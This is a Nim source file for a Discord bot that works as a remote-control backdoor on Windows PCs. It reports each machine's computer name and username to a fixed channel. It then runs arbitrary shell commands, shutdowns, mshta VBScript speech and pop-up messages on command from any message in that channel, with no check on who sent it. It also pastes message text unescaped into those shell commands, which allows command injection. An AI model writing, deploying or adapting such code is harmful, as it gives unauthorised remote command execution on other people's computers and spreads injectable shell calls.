import dimscord, asyncdispatch, options, os, strutils, osproc
import dotenv
import constants
import checkForUpdates
import json
import getUptime
load()

let THISPC*: string = getEnv("COMPUTERNAME")
let TOKEN*: string = getEnv("TOKEN")

var THISPCSTR*: string = "`" & THISPC & "`: "
var alias: string = "noalias"
var voiceNumber: int = 0

let discord = newDiscordClient(TOKEN)

proc save(CHANNEL: string, MESSAGE: string, discord: DiscordClient) {.async.} =
  while true:
    await sleepAsync(180000) # 3 minute 180000

    let uptime = getUptime()

    discard await discord.api.editMessage(CHANNEL, MESSAGE, "deschis de: " &
       $uptime.hours & " h " & $uptime.minutes & " m")

proc writeSettings() =
  let settings: JsonNode = %* {"alias": alias, "voiceNumber": voiceNumber}

  writeFile("settings", $settings)

proc readSettings() =
  try:
    let settingsRaw: string = readFile("settings")

    let settings: JsonNode = parseJson settingsRaw

    alias = getStr settings["alias"]
    THISPCSTR = "`" & alias & "(" & THISPC & ")`: "

    voiceNumber = getInt settings["voiceNumber"]
  except:
    writeSettings()
    readSettings()

proc onReady(s: Shard, r: Ready) {.event(discord).} =
  echo "Ready as " & $r.user

  readSettings()

  if alias == "danut":
    var message = await discord.api.sendMessage("862728687039807492", "<@862753651108872212> calculator deschis")
    discard save(message.channel_id, message.id, discord)
  else:
    discard await discord.api.sendMessage(
      "847087245605601290",
      THISPCSTR & "started `" & $VERSION & "` as " & getEnv("USERNAME")
    )

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
  let CHANNEL: string = m.channel_id

  case m.content
  of "!ping":
    discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "pong")
  of "!teiubi", "!teiubi:(":
    if m.author.id == "762179762860326923" or m.author.id == "561593145977208836":
      discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "sieuteiubi:(")
    else:
      discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "eu o iubi doar pe maria:(")
  of "!list":
    discard discord.api.sendMessage(
      CHANNEL,
      THISPCSTR & "started `" & $VERSION & "` as " & getEnv("USERNAME")
    )
  else:
    try:
      if m.content.startsWith(THISPC) or m.content.startsWith(alias):
        var command: string

        if m.content.startsWith(THISPC):
          command = m.content.split(THISPC & " ")[1]
        elif m.content.startsWith(alias):
          command = m.content.split(alias & " ")[1]


        if (command.startsWith("shutdown")):
          try:
            let msg: string = command.split("shutdown ")[1]

            discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "shutting down")
            discard execShellCmd("shutdown /s /t 10 /c \"" & msg & "\"")

          except:
            discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "shutting down")
            discard execShellCmd("shutdown /s /t 10")

        if (command.startsWith("quit")):
          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "quitting")

          quit(0)

        if (command.startsWith("update")):
          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "trying to update")

          checkForUpdates()

        if (command.startsWith("version")):
          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & $VERSION)

        elif (command.startsWith("cmd")):
          let cmd: string = command.split("cmd ")[1]

          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "running cmd")

          let errCode = execShellCmd(cmd)

          discard await discord.api.sendMessage(
            CHANNEL,
            THISPCSTR & "ran with err code: " & $errCode
          )
        elif (command.startsWith("start")):
          let cmd: string = command.split("start ")[1]

          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "starting...")

          let errCode = execShellCmd("start " & cmd)

          discard await discord.api.sendMessage(
            CHANNEL,
            THISPCSTR & "ran with err code: " & $errCode
          )
        elif (command.startsWith("say")):
          let text: string = command.split("say ")[1]

          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "saying...")

          let errCode = (
            execCmdEx(
              """mshta vbscript:Execute("Dim sapi:Set sapi = createObject(""sapi.spvoice""):Set sapi.Voice = sapi.GetVoices.Item(""" &
              $voiceNumber & """):sapi.Speak(""""" & text &
              """"")(window.close)")""").exitCode
          )

          discard await discord.api.sendMessage(
            CHANNEL,
            THISPCSTR & "ran with err code: " & $errCode
          )

        elif (command.startsWith("alias")):
          let alias_msg: string = command.split("alias ")[1]

          alias = alias_msg

          THISPCSTR = "`" & alias & "(" & THISPC & ")`: "

          writeSettings()

          discard await discord.api.sendMessage(
            CHANNEL,
            THISPCSTR & "new alias: `" & alias & "`"
          )
        elif (command.startsWith("voice")):
          let voiceNumber_msg: string = command.split("voice ")[1]

          voiceNumber = parseInt voiceNumber_msg

          writeSettings()

          discard await discord.api.sendMessage(
            CHANNEL,
            THISPCSTR & "new voice: `" & voiceNumber_msg & "`"
          )

        elif (command.startsWith("msg")):
          let message: string = command.split("msg ")[1]

          discard await discord.api.sendMessage(CHANNEL, THISPCSTR & "showing message")

          let errCode = execShellCmd("msg %username% " & message)

          discard await discord.api.sendMessage(
            CHANNEL,
            THISPCSTR & "ran with err code: " & $errCode
          )
    except:
      discard

var notStarted: bool = true

while notStarted:
  try:
    waitFor discord.startSession()

    notStarted = false
  except:
    sleep(2000)
